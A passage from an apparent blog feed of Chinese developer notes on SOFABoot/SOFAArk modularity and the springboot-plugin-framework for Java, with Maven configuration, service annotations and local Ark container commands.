--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- http://docs.spring.io/spring-boot/docs/current/maven-plugin/usage.html --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- executable fat jar --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>../target/boot<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">classifier</span>&gt;</span>executable<span class="tag">&lt;/<span class="name">classifier</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>Annotation方式发布和引用服务，还支持XML和API的方式</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端使用 @SofaService 注解来发布服务</span></span><br><span class="line"><span class="comment">// 一般将接口(此处的SampleJvmService)放到一个门面(Facade)子工程中，这样服务提供者和消费者可同时引入此接口工程依赖</span></span><br><span class="line"><span class="meta">@SofaService</span> <span class="comment">// @SofaService(uniqueId = "annotationImpl")</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SampleJvmServiceAnnotationImpl</span> <span class="keyword">implements</span> <span class="title">SampleJvmService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">message</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello, jvm service annotation implementation."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端使用 @SofaReference 开引用服务</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JvmServiceConsumer</span> <span class="keyword">implements</span> <span class="title">ClientFactoryAware</span> </span>&#123;</span><br><span class="line">    <span class="meta">@SofaReference</span> <span class="comment">// @SofaReference(uniqueId = "annotationImpl")</span></span><br><span class="line">    <span class="keyword">private</span> SampleJvmService sampleJvmServiceAnnotationImpl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>定义 SOFABoot 模块（类似模块的导入导出）</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># resources/sofa-module.properties</span></span><br><span class="line"><span class="comment"># 当前模块名，模块名只需要保证全局唯一即可(一般可使用pom包名)</span></span><br><span class="line"><span class="attr">Module-Name</span>=com.alipay.sofa.service-consumer</span><br><span class="line"><span class="comment"># 需要引入的模块</span></span><br><span class="line"><span class="attr">Require-Module</span>=com.alipay.sofa.service-provider</span><br></pre></td></tr></table></figure><h3 id="扩展点"><a href="#扩展点" class="headerlink" title="扩展点"></a>扩展点</h3><ul><li>SOFABoot 支持模块化隔离，在实际的使用场景中，一个模块中的 bean 有时候需要开放一些入口，供另外一个模块扩展</li><li>SOFABoot 借鉴和使用了 Nuxeo Runtime 项目 以及 <a href="https://github.com/nuxeo" target="_blank" rel="noopener">nuxeo</a> 项目(较早的一款企业模块化项目)，并在上面扩展，与 Spring 融合，提供扩展点的能力</li><li>案例：<a href="https://github.com/glmapper/glmapper-sofa-extension" target="_blank" rel="noopener">https://github.com/glmapper/glmapper-sofa-extension</a><ul><li>说明文档：<a href="https://blog.csdn.net/weixin_33810006/article/details/89534212" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33810006/article/details/89534212</a></li></ul></li><li>使用流程<ul><li>定义一个需要被扩展的 bean 接口</li><li>实现上述 bean 接口，并增加函数registerExtension用来接受扩展传递过来的扩展值(普通扩展值/扩展bean名)，通过接受此扩展值来覆盖当前实现类的属性值</li><li>定义扩展点(可以理解为上述bean的哪个属性)</li><li>注册扩展点</li><li>实现扩展(实现上述bean接口)</li><li>定义扩展值(如果基于客户端进行注册时，需要单独写到xml文件中)</li><li>注册扩展</li></ul></li><li>缺陷：不支持  跨Ark Biz进行扩展</li><li><strong>SqBiz扩展(支持跨Ark Biz的扩展)</strong><ul><li>背景：由于SOFABoot拓展点跨Ark则无法使用(扩展点和扩展注册时均保存在ComponentManagerImpl#registry中，而此类并未暴露成Ark Plugin，从而类属性数据不共享)；且SOFAArk自定义扩展点只适用于 Ark Plugin 之间</li><li>原理：跨模块可以通过uniqueId+ISqSofaService接口获取到对应服务，再通过SpringU反射调用服务</li><li>使用<ul><li>(1) 注册扩展：<code>SqSofaExtensionHelper.register(TaokeConst.SofaUniqueId, UserInfoExtension.class, &quot;createUserInfoEnd&quot;);</code> (注意主类需加@EnableSqU)</li><li>(2) 调用扩展：<code>SqSofaExtensionHelper.invoke(UserInfoExtension.class, &quot;createUserInfoEnd&quot;, &quot;123456&quot;);</code></li></ul></li></ul></li></ul><h2 id="SOFAArk"><a href="#SOFAArk" class="headerlink" title="SOFAArk"></a>SOFAArk</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ul><li><a href="https://www.sofastack.tech/projects/sofa-boot/sofa-ark-readme/" target="_blank" rel="noopener">SOFAArk 介绍</a></li><li>SOFAArk 类隔离框架设计实现主要基于 OSGi 规范及蚂蚁金服的 CloudEngine 容器；同时也参考了 Spring Boot 及阿里的 PandoraBoot</li><li><strong>相关框架解读</strong><ul><li><a href="https://blog.csdn.net/maoyeqiu/article/details/108994304" target="_blank" rel="noopener">https://blog.csdn.net/maoyeqiu/article/details/108994304</a></li><li><a href="https://blog.hufeifei.cn/2020/05/Alibaba/Pandora/" target="_blank" rel="noopener">https://blog.hufeifei.cn/2020/05/Alibaba/Pandora/</a></li></ul></li><li><p>架构图</p><p>  <img src="/data/images/java/sofaark-arch.png" alt="sofaark-arch.png"></p><ul><li>如果 Ark 包只打包了一个 Biz，则该 Biz 默认成为宿主应用；如果 Ark 包打包了多个 Biz 包，需要配置指定宿主应用</li><li>宿主应用不允许被卸载，一般而言，宿主应用会作为流量入口的中台系统，具体的服务实现会放在不同的动态 Biz 中，供宿主应用调用</li><li>宿主应用可以使用 SOFAArk 提供的客户端 API 实现动态应用的部署和卸载</li></ul></li><li><strong><code>Ark 包</code></strong>是可执行 Fat Jar，一般由 Ark Container、Ark Plugin(0个或多个)、Ark Biz(至少一个)<ul><li><code>Ark Container</code><ul><li>SOFAArk 容器(由sofa-ark-container模块提供)，负责 Ark 包启动运行时的管理；Ark Plugin 和 Ark Biz 运行在 SOFAArk 容器之上；容器具备管理插件和应用的功能</li><li>运行 Ark 包，Ark Container 优先启动，容器自动解析 Ark 包中含有的 Ark Plugin 和 Ark Biz，并读取他们的配置信息，构建类和资源的加载索引表</li><li>然后使用独立的 ClassLoader 加载并按优先级配置依次启动</li></ul></li><li><code>Ark Plugin</code><ul><li>Ark 插件，满足特定目录格式要求的 Fat Jar，可以将一个或多个普通的 Java jar 打包成一个标准格式的 Ark Plugin。使用官方提供的 Maven 插件 <code>sofa-ark-plugin-maven-plugin</code>打包。<a href="https://www.sofastack.tech/projects/sofa-boot/sofa-ark-ark-plugin/" target="_blank" rel="noopener">参考文档</a></li><li>运行时由独立的 PluginClassLoader 加载，根据打包时配置的导出导入资源、类，构建运行时类加载模型。一般是Service包，不包含Controller层</li><li><strong>需要在pom中设置依赖关系</strong></li><li><strong>更多的用处是类隔离</strong>：假设项目依赖A、B两个jar包，而A、B又分别依赖C1和C2，从而可能导致包依赖冲突，而假设A、B是打包出来的Ark Plugin(只暴露服务类，C相关的内可不用导出)则不会存在问题，可同时引用到项目中，其他用法同普通jar包引用。参考：<a href="https://juejin.cn/post/6844903653828984845" target="_blank" rel="noopener">https://juejin.cn/post/6844903653828984845</a></li><li><strong>还可抽离依赖</strong>：将相同的依赖打成插件包到基座中，从而其他Biz包只需要引入相关包或类即可，减少Biz包的体积</li></ul></li><li>Ark Biz<ul><li>Ark 应用(配置、源码、依赖)被打包成 Biz 包组织在一起，但是特殊的依赖（Ark Plugin 和其他应用 Biz 包）不会被打入 Biz 包中，<strong><code>Ark Biz</code> 包是不可执行的 Fat Jar</strong>。使用官方提供的 Maven 插件 <code>sofa-ark-maven-plugin</code>打包成上述Fat Jar。<a href="https://www.sofastack.tech/projects/sofa-boot/sofa-ark-ark-jar/" target="_blank" rel="noopener">参考文档同Ark包</a></li><li>Ark Biz 是工程应用以及其依赖包的组织单元，包含应用启动所需的所有依赖和配置；一个 Ark 包中可以包含多个 Ark Biz 包，按优先级依次启动，Biz 之间通过 JVM 服务交互</li><li>可以包含Controller层(引入web依赖即可)</li><li><a href="https://www.sofastack.tech/projects/sofa-boot/sofa-ark-biz-lifecycle/" target="_blank" rel="noopener">Ark Biz 生命周期</a></li></ul></li><li>启动顺序：Ark Container &gt; Ark Plugin &gt; Ark Biz</li><li><strong>类索引关系说明</strong><ul><li>Ark Biz 之间通过 JVM 服务(Ark概念)交互，即使用@SofaService/@SofaReference进行交互<ul><li>每个Biz有自己的Controller层，原本是部署在不同的JVM，因此需要通过网络交互(如RPC)；而Ark架构，支持合并部署Biz，此时使用JVM服务交互，减少网络传输层</li></ul></li><li>Ark Biz 和 Ark Plugin 是单向类索引关系，即只允许 Ark Biz 索引 Ark Plugin 加载的类和资源，反之则不允许(只能Ark Biz调用Ark Plugin)。Ark Biz无需打包Ark Plugin，会自动优先查找Ark Plugin，也可定义禁止优先查找Ark Plugin的类(加入Plugin封装了第三方jar，Biz对第三方jar的依赖可维持不变，仅在打包时配置剔除此第三方jar从而减小打包体积)</li><li>Ark Plugin 之间是双向类索引关系，即可以相互委托对方加载所需的类和资源(Ark Plugin可相互调用)。Ark Plugin只会优先从其他Ark Plugin中查找导入的类，未导入的则从当前Ark Plugin查找</li></ul></li></ul></li><li>SofaArk相关常量参考<code>com.alipay.sofa.ark.spi.constant.Constants</code></li></ul><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><ul><li>参考：<a href="https://www.sofastack.tech/projects/sofa-boot/sofa-ark-biz-lifecycle/" target="_blank" rel="noopener">https://www.sofastack.tech/projects/sofa-boot/sofa-ark-biz-lifecycle/</a></li><li>Ark 容器启动流程：<a href="https://www.sofastack.tech/projects/sofa-boot/sofa-ark-startup/" target="_blank" rel="noopener">https://www.sofastack.tech/projects/sofa-boot/sofa-ark-startup/</a></li><li>Biz生命周期<ul><li>unresolved: 未注册，此时 Biz 包未被运行时解析</li><li>resolved: Biz 包解析完成，且已注册，此时 Biz 包还没有安装或者安装中</li><li>activated: Biz 包启动完成，且处于激活状态，可以对外提供服务</li><li>deactivated: Biz 包启动完成，但出于未激活状态，模块多个版本时，只有一个版本出于激活状态(注意这个状态只对 JVM 服务生效，对 RPC 等其他中间件无效)</li><li>broken: Biz 包启动失败后状态</li></ul></li><li>安装 Biz<ul><li>解析模块</li><li>注册模块</li><li>启动模块</li><li>健康检查</li><li>切换状态</li></ul></li></ul><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><ul><li>官方文档目前是v1.0的(但是升级v1.0存在其他问题)</li><li>v0.6暂不知道如果发送事件，通过<code>ArkServiceContainerHolder.getContainer().getService(EventAdminService.class).sendEvent(...)</code>会报空指针，因为ArkServiceContainerHolder.getContainer()只有在container所在Ark才有值，连主Biz也无法获取到(和Ark container使用得是不同的类加载器)</li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li>参考 <a href="https://github.com/sofastack-guides/sofa-ark-dynamic-guides" target="_blank" rel="noopener">https://github.com/sofastack-guides/sofa-ark-dynamic-guides</a></li><li>命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 连接container，成功会显示命令行`sofa-ark&gt;`</span></span><br><span class="line">telnet localhost 1234</span><br><span class="line"><span class="comment">## 退出</span></span><br><span class="line">Ctrl+] <span class="comment"># 退出到telnet命令行</span></span><br><span class="line">quit <span class="comment"># 退出到命令行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看帮助</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"><span class="comment">## biz</span></span><br><span class="line"><span class="comment"># 安装biz包</span></span><br><span class="line">biz -i file:///C:/Users/smalle/Desktop/sofa-ark-dynamic-guides-master/target/ark-dynamic-module-1.0.0-ark-biz.jar</span><br><span class="line"><span class="comment"># 卸载biz包</span></span><br><span class="line">biz -u ark-dynamic-module:0.0.1</span><br><span class="line"><span class="comment"># 查看所有安装的biz包</span></span><br><span class="line">biz -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># plugin</span></span><br><span class="line"><span class="comment"># 查看所有plugin列表</span></span><br><span class="line">plugin -a</span><br></pre></td></tr></table></figure><h4 id="动态引入Biz"><a href="#动态引入Biz" class="headerlink" title="动态引入Biz"></a>动态引入Biz</h4><ul><li>动态Ark Biz包安装方式<ul><li>telnet：Ark容器默认会启动一个监听在1234端口的telnet服务</li><li>API：使用<code>ArkClient</code>类</li><li>zookeeper方式</li></ul></li><li>sofa v3.1.4<ul><li>必须要main方法</li><li>必须要定义spring.application.name配置</li><li>不能有sofa-module.properties配置</li><li>引入依赖：runtime-sofa-boot-plugin、sofa-ark-springboot-starter、web-ark-plugin</li><li>一般可设置 com.alipay.sofa.boot.skipJvmReferenceHealthCheck=true, 即配置为不检查组件的健康状态（如有些组件实现是通过ark动态安装进来的，就会出现Biz启动不成功的问题）</li></ul></li></ul><h4 id="多Biz启动"><a href="#多Biz启动" class="headerlink" title="多Biz启动"></a>多Biz启动</h4><ul><li>开发环境(sofa v3.6.0, 此版本不支持Biz间服务调用)<ul><li>在启动类所在模块根目录增加<code>conf/ark/bootstrap.properties</code></li><li>并设置master biz: <code>com.alipay.sofa.ark.master.biz=Startup In IDE</code></li><li>然后将其他biz-jar放到某个文件夹下，并将此文件夹添加到此模块的依赖包中(ark会扫码classpath下所有jar看是否为plugin或biz)</li></ul></li></ul><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><ul><li>com.alipay.sofa.runtime.spi.log.SofaLogger 日志<ul><li><code>SofaLogger.info(&quot;SofaRuntime is activating.&quot;, new Object[0]);</code></li></ul></li></ul><h3 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h3><ul><li>引入sofa-ark-plugin-maven后，说明此模块为Biz模块，可以为Ark包(包含主Ark Biz + ArK Container + Plugins)或Ark Biz(普通Biz)</li><li>引入sofa-ark-plugin-maven-plugin后，说明此模块为plugin模块，最终打包出来的是ark plugin<ul><li>一般是引入到主Biz中打包到Ark包中，其他Biz包只需依赖scope=provided引入，最终Biz包也不会包含此插件jar</li></ul></li><li>sofa ark shade</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--the specify dependency would not be contained in lib directory, but shaded in ark plugin--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">shades</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">shade</span>&gt;</span>com.alipay.sofa:sample-ark-plugin-common:1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">shade</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">shades</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><ul><li>IDE启动报错：<code>javax.management.InstanceAlreadyExistsException: org.springframework.boot:type=Admin,name=SpringApplication</code><ul><li>参考：<a href="https://github.com/sofastack/sofa-boot/issues/327" target="_blank" rel="noopener">https://github.com/sofastack/sofa-boot/issues/327</a></li><li>IDEA启动时会自动增加一些参数，如<code>-Dcom.sun.management.jmxremote ... -Dspring.application.admin.enabled=true</code>等。此时可通过设置IDEA启动配置的参数覆盖，<strong>如增加<code>spring.application.json={&quot;spring.application.admin.enabled&quot;: false}</code></strong></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.sofastack.tech/&quot; target=&quot;_blank&quot; rel=&quot;noope
      
    
    </summary>
    
      <category term="java" scheme="http://blog.aezo.cn/categories/java/"/>
    
    
      <category term="springboot" scheme="http://blog.aezo.cn/tags/springboot/"/>
    
      <category term="微服务" scheme="http://blog.aezo.cn/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    
      <category term="plugin" scheme="http://blog.aezo.cn/tags/plugin/"/>
    
  </entry>
  
  <entry>
    <title>springboot-plugin-framework —— 插件化</title>
    <link href="http://blog.aezo.cn/2021/04/06/java/archive/springboot-plugin-framework/"/>
    <id>http://blog.aezo.cn/2021/04/06/java/archive/springboot-plugin-framework/</id>
    <published>2021-04-06T13:54:00.000Z</published>
    <updated>2021-08-31T06:07:20.351Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><strong>2021-04转向sofastack</strong></li><li><a href="https://gitee.com/starblues/springboot-plugin-framework-parent" target="_blank" rel="noopener">springboot-plugin-framework</a>、<a href="http://www.starblues.cn/" target="_blank" rel="noopener">文档</a></li><li>基于<a href="https://github.com/pf4j/pf4j" target="_blank" rel="noopener">pf4j</a></li><li><a href="https://gitee.com/starblues/springboot-plugin-framework-parent/tree/master/springboot-plugin-framework-extension" target="_blank" rel="noopener">springboot-plugin-framework扩展</a><ul><li>对mybatis和mybatis-plus进行了支持，插件中可使用mybatis</li><li>对resources进行了支持，插件中可使用资源文件，从而显示视图层返回模板页面</li></ul></li><li><strong>开发时</strong>，开发时需要提前将插件编译出jar，再启动主程序<ul><li>从而可让 idea 启动主程序时，自动编译插件包的配置。为了在每次启动主程序的时候，能够动态编译插件包，保证插件包的target是最新的</li><li>选择 File-&gt;Project Structure-&gt;Project Settings-&gt;Artifacts-&gt;点击+号-&gt;JAR-&gt;From modules whith dependencies-&gt;选择对应的插件包-&gt;确认OK</li><li>启动配置: 在Before launch 下-&gt; 点击小+号 -&gt; Build -&gt; Artifacts -&gt; 选择上一步新增的&gt;Artifacts</li><li>之后启动时会产生一个out/artifacts的目录保存编译好的插件jar包</li></ul></li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul><li>新建插件时，<strong>需要继承<code>BasePlugin</code>类，并将其放在插件src根目录</strong>(插件只能扫描到当前类同级目录或其子目录下的类)<ul><li>因为会基于此类进行扫描插件其他类，并进行分组，分组相关逻辑参考包<code>com.gitee.starblues.factory.process.pipe.classs.group</code></li></ul></li><li><strong>插件controller层路径</strong><ul><li><code>&quot;http://ip:port/&quot; + server.servlet.context-path + DefaultIntegrationConfiguration.pluginRestPathPrefix + (enablePluginIdRestPathPrefix=true时还需加入插件ID) + Controller#RequestMapping + Method#RequestMapping</code></li></ul></li><li><strong>在插件中无法直接注入主项目Bean，需要通过<code>PluginUtils</code>间接获取</strong><ul><li>PluginUtils可直接注入到插件项目中，然后通过<code>@PostConstruct</code>在初始化方法中调用<code>pluginUtils.getMainBean(MainIService.class)</code>获取主程序Bean</li><li>PluginUtils功能：可在插件中获取主程序中Spring容器中的bean，可获取当前插件的信息，只能作用于当前插件</li></ul></li><li>插件自定义yml配置，映射Bean时，不能通过<code>@ConfigurationProperties</code>注解，而要使用<code>@ConfigDefinition</code></li><li><p>maven配置说明</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 主项目：高版本(&gt;Spring-boot 2.1.1.RELEASE)需要新增repackage --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    1.插件如果引入了第三方包(而主程序又没有引入的)，则需要使用 maven-assembly-plugin 的 jar-with-dependencies 功能将依赖的class全部打包到插件的jar包中 </span></span><br><span class="line"><span class="comment">    2.打包插件时，必须将插件包与主程序相同的依赖(特别是版本号不同的)排除掉，不要打入jar包中</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>插件相互调用</p><ul><li>插件1调用插件2方法，插件1的POM中无需引入插件2。主程序也无需引入插件的POM</li><li>插件1调用插件2方法，插件1中需要重新定义一次插件2中需要调用的方法</li></ul></li><li>使用mybatis扩展(参考官方源码中文的)<ul><li>xmlLocationsMatch中定义的xml路径不能和主程序中的xml路径在<code>resources</code>相对一致，建议使用不同名称区分开。如<code>xmlLocationsMatch.add(&quot;classpath:mapper/minions/**/*Mapper.xml&quot;);</code></li><li><strong>定义的Mapper接口需要加上注解<code>@Mapper</code></strong></li><li>插件默认使用主程序的数据源配置，可通过reSetMainConfig进行重写配置（重写后不影响主程序的配置, 只在当前插件中起作用）；插件也可以使用自定义的数据源</li><li><strong>在插件中无法使用mybatis-plus的 <code>LambdaQueryWrapper</code> 条件构造器</strong>，部分场景可使用QueryWrapper + Lombok的@SuperBuilder链式调用</li><li>插件的mapper.xml文件无法引用主程序中的sql片段</li></ul></li><li>使用resources扩展(参考官方源码中文的)<ul><li>插件中需实现接口<code>StaticResourceConfig</code>，并映射出静态文件目录如<code>classpath:static/minions</code></li><li>插件中<code>resources</code>中存放的资源文件目录一定不能和主程序相同，否则就会加载到主程序的资源</li></ul></li><li>插件依赖其他jar包时配置说明</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- sqbiz-plugin父工程 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--支持自定义的打包结构，也可以定制依赖项，设置MANIFEST.MF文件等--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;maven-assembly-plugin.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>sqbiz-$&#123;project.artifactId&#125;-$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">addDefaultImplementationEntries</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addDefaultImplementationEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">addDefaultSpecificationEntries</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addDefaultSpecificationEntries</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Plugin-Id</span>&gt;</span>$&#123;plugin.id&#125;<span class="tag">&lt;/<span class="name">Plugin-Id</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Plugin-Version</span>&gt;</span>$&#123;plugin.version&#125;<span class="tag">&lt;/<span class="name">Plugin-Version</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Plugin-Provider</span>&gt;</span>$&#123;plugin.provider&#125;<span class="tag">&lt;/<span class="name">Plugin-Provider</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Plugin-Class</span>&gt;</span>$&#123;plugin.class&#125;<span class="tag">&lt;/<span class="name">Plugin-Class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Plugin-Description</span>&gt;</span>$&#123;plugin.dependencies&#125;<span class="tag">&lt;/<span class="name">Plugin-Description</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptors</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span 